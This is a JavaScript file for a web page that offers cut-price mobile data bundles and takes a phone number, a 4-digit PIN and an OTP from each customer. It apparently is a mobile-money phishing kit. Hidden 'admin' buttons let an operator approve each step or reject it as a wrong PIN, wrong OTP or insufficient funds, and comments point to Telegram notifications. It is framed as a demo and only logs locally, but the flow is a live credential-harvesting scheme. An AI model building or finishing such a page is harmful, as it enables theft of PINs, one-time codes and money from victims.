const PACKAGES = [
  { name: "5 GB", validity: "1 day", price: "$0.25" },
  { name: "10 GB", validity: "3 days", price: "$0.80" },
  { name: "20 GB", validity: "7 days", price: "$1.20" },
  { name: "40 GB", validity: "7 days", price: "$2.00" },
  { name: "80 GB", validity: "21 days", price: "$2.25" },
  { name: "120 GB", validity: "30 days", price: "$3.00" },
  { name: "Unlimited", validity: "30 days", price: "$8.00" }
];

let selectedPackage = null;
let customerPhone = "";
let countdownTimer = null;
let otpSeconds = 60;

const $ = (id) => document.getElementById(id);

function showPage(pageId) {
  ["packagePage", "pinPage", "otpPage", "successPage"]
    .forEach(id => $(id).classList.add("hidden"));

  $(pageId).classList.remove("hidden");
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function renderPackages() {
  const box = $("packages");
  PACKAGES.forEach((item, index) => {
    const div = document.createElement("div");
    div.className = "package";
    div.innerHTML = `
      <div class="package-top">
        <div>
          <div class="package-name">${item.name}</div>
          <div class="validity">Valid for ${item.validity}</div>
        </div>
        <div class="package-price">${item.price}</div>
      </div>
      <button class="primary" data-index="${index}">CHOOSE THIS PACKAGE</button>
    `;
    div.querySelector("button").addEventListener("click", () => selectPackage(index));
    box.appendChild(div);
  });
}

function selectPackage(index) {
  selectedPackage = PACKAGES[index];

  $("pinPackage").textContent = selectedPackage.name;
  $("pinValidity").textContent = selectedPackage.validity;
  $("pinPrice").textContent = selectedPackage.price;

  clearPinErrors();
  $("pinStatus").classList.add("hidden");
  showPage("pinPage");
}

function clearPinErrors() {
  $("phone").classList.remove("input-error");
  $("pin").classList.remove("input-error");
  $("phoneError").classList.remove("show");
  $("pinError").classList.remove("show");
}

function clearOtpErrors() {
  $("otp").classList.remove("input-error");
  $("otpError").classList.remove("show");
  $("otpExpiredNotice").classList.add("hidden");
}

function validPhone(value) {
  return /^9\d{8}$/.test(value);
}

function validFourDigits(value) {
  return /^\d{4}$/.test(value);
}

$("pinContinue").addEventListener("click", submitPin);

function submitPin() {
  clearPinErrors();

  const phone = $("phone").value.trim();
  const pin = $("pin").value.trim();
  let valid = true;

  if (!validPhone(phone)) {
    $("phone").classList.add("input-error");
    $("phoneError").classList.add("show");
    valid = false;
  }

  if (!validFourDigits(pin)) {
    $("pin").classList.add("input-error");
    $("pinError").classList.add("show");
    valid = false;
  }

  if (!valid) return;

  customerPhone = phone;

  $("pinWaiting").classList.remove("hidden");
  openPinAdminDemo();
}

function openPinAdminDemo() {
  $("demoAdmin").classList.remove("hidden");
  $("pinAdminButtons").classList.remove("hidden");
  $("otpAdminButtons").classList.add("hidden");
}

function openOtpPage() {
  $("otpPackage").textContent = selectedPackage.name;
  $("otpPhone").textContent = "+243 " + customerPhone;

  clearOtpErrors();
  $("otp").value = "";
  $("otpWaiting").classList.add("hidden");
  $("requestOtp").classList.add("hidden");
  $("otpVerify").classList.remove("hidden");
  $("otpBack").classList.remove("hidden");

  showPage("otpPage");
  startOtpCountdown();
}

function startOtpCountdown() {
  if (countdownTimer) clearInterval(countdownTimer);

  otpSeconds = 60;
  updateCountdown();

  countdownTimer = setInterval(() => {
    otpSeconds -= 1;
    updateCountdown();

    if (otpSeconds <= 0) {
      clearInterval(countdownTimer);
      countdownTimer = null;
      expireOtp();
    }
  }, 1000);
}

function updateCountdown() {
  $("countdownText").innerHTML =
    otpSeconds > 0
      ? `OTP expires in <strong>${otpSeconds}</strong> seconds`
      : `OTP has expired`;
}

function expireOtp() {
  $("otp").value = "";
  $("otp").classList.add("input-error");
  $("otpError").textContent = "OTP expired. Please request another OTP.";
  $("otpError").classList.add("show");

  $("otpVerify").classList.add("hidden");
  $("requestOtp").classList.remove("hidden");
  $("otpExpiredNotice").classList.remove("hidden");

  // The expired state is local in this demo.
  // A real backend can notify Telegram here.
  notifyOtpRequestToDemo("OTP expired");
}

$("requestOtp").addEventListener("click", requestAnotherOtp);

function requestAnotherOtp() {
  clearOtpErrors();
  $("otp").value = "";

  // Simulates the Telegram notification for a new OTP request.
  notifyOtpRequestToDemo("Customer requested another OTP");

  $("requestOtp").classList.add("hidden");
  $("otpVerify").classList.remove("hidden");
  $("otpWaiting").classList.add("hidden");

  startOtpCountdown();
}

$("otpVerify").addEventListener("click", submitOtp);

function submitOtp() {
  clearOtpErrors();

  const otp = $("otp").value.trim();

  if (!validFourDigits(otp)) {
    $("otp").classList.add("input-error");
    $("otpError").textContent = "Enter the required 4-digit OTP.";
    $("otpError").classList.add("show");
    return;
  }

  if (otpSeconds <= 0) {
    expireOtp();
    return;
  }

  $("otpWaiting").classList.remove("hidden");
  openOtpAdminDemo();
}

function openOtpAdminDemo() {
  $("demoAdmin").classList.remove("hidden");
  $("pinAdminButtons").classList.add("hidden");
  $("otpAdminButtons").classList.remove("hidden");
}

function adminPinDecision(action) {
  $("demoAdmin").classList.add("hidden");
  $("pinWaiting").classList.add("hidden");

  if (action === "approve") {
    openOtpPage();
    return;
  }

  if (action === "wrong-pin") {
    $("pin").value = "";
    $("pin").classList.add("input-error");
    $("pinError").textContent = "Wrong PIN. Please enter your PIN again.";
    $("pinError").classList.add("show");
  }
}

function adminOtpDecision(action) {
  $("demoAdmin").classList.add("hidden");
  $("otpWaiting").classList.add("hidden");

  if (action === "approve") {
    if (countdownTimer) clearInterval(countdownTimer);
    showSuccessPage();
    return;
  }

  if (action === "wrong-otp") {
    $("otp").value = "";
    $("otp").classList.add("input-error");
    $("otpError").textContent = "Wrong OTP. Please enter the correct OTP.";
    $("otpError").classList.add("show");
    return;
  }

  if (action === "otp-expired") {
    expireOtp();
    return;
  }

  if (action === "wrong-pin-from-otp") {
    showPage("pinPage");
    $("pin").value = "";
    $("pin").classList.add("input-error");
    $("pinError").textContent = "Wrong PIN. Please enter your PIN again.";
    $("pinError").classList.add("show");
    return;
  }

  if (action === "insufficient") {
    showPage("pinPage");
    $("pinStatus").className = "status error";
    $("pinStatus").textContent =
      "Insufficient money. Please check the payment details and try again.";
    $("pinStatus").classList.remove("hidden");
    return;
  }
}

function showSuccessPage() {
  $("successPackage").textContent = selectedPackage.name;
  $("successValidity").textContent =
    "Validity: " + selectedPackage.validity;

  showPage("successPage");
}

function notifyOtpRequestToDemo(message) {
  // This function intentionally only updates the local demo.
  // For production, send a non-sensitive event to your secure backend,
  // and let the backend communicate with your Telegram bot.
  console.info("[Telegram notification simulation]", {
    event: message,
    package: selectedPackage ? selectedPackage.name : "",
    phone: customerPhone ? "+243 " + customerPhone : ""
  });
}

$("pinBack").addEventListener("click", () => showPage("packagePage"));

$("otpBack").addEventListener("click", () => {
  if (countdownTimer) clearInterval(countdownTimer);
  showPage("pinPage");
});

$("doneButton").addEventListener("click", () => location.reload());

$("pin").addEventListener("input", function () {
  this.value = this.value.replace(/\D/g, "").slice(0, 4);
});

$("otp").addEventListener("input", function () {
  this.value = this.value.replace(/\D/g, "").slice(0, 4);
});

$("phone").addEventListener("input", function () {
  this.value = this.value.replace(/\D/g, "").slice(0, 9);
});

/*
  Demo admin button wiring.
*/
document.querySelectorAll("[data-action]").forEach(button => {
  button.addEventListener("click", () => {
    const action = button.dataset.action;

    if (action === "pin-approve") {
      adminPinDecision("approve");
    } else if (action === "wrong-pin") {
      if (!$("otpPage").classList.contains("hidden")) {
        adminOtpDecision("wrong-pin-from-otp");
      } else {
        adminPinDecision("wrong-pin");
      }
    } else if (action === "otp-approve") {
      adminOtpDecision("approve");
    } else if (action === "wrong-otp") {
      adminOtpDecision("wrong-otp");
    } else if (action === "insufficient") {
      adminOtpDecision("insufficient");
    } else if (action === "wrong-pin-from-otp") {
      adminOtpDecision("wrong-pin-from-otp");
    } else if (action === "otp-expired") {
      adminOtpDecision("otp-expired");
    }
  });
});

renderPackages();
